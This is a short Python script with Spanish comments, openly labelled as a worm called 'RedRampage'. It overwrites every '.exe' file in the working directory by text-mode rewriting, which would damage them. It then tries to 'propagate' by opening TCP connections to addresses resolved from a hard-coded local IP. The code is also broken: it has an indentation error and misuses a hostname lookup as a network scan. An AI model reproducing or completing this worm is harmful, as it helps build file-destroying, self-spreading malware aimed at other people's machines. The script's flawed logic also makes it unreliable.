import socket
import os

# Configuración del worm
IP_TARGET = '192.168.1.100'  # Dirección IP objetivo
PORT = 8080  # Puerto objetivo

def infectar_archivos(archivos):
    for archivo in archivos:
        try:
            with open(archivo, 'r') as f:
                contenido = f.read()
                f.close()

            with open(archivo, 'w') as f:
                f.write(contenido + '\n\n# Infección por RedRampage')

            print(f"Infectado {archivo}")
        except Exception as e:
            print(f"Error al infectar {archivo}: {e}")

def propagar_red():
    # Buscar dispositivos conectados a la red
    devices = socket.gethostbyname_ex(IP_TARGET)
     for dispositivo in devices[2]:
        try:
            # Conectar al dispositivo y enviar el worm
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((dispositivo, PORT))
            sock.sendall(b'Infección por RedRampage')

            print(f"Propagado a {dispositivo}")
        except Exception as e:
            print(f"Error al propagar a {dispositivo}: {e}")

def main():
    # Buscar archivos en el sistema
    archivos = os.listdir()

    for archivo in archivos:
        if archivo.endswith('.exe'):
            infectar_archivos([archivo])

    propagar_red()

if __name__ == '__main__':
    main()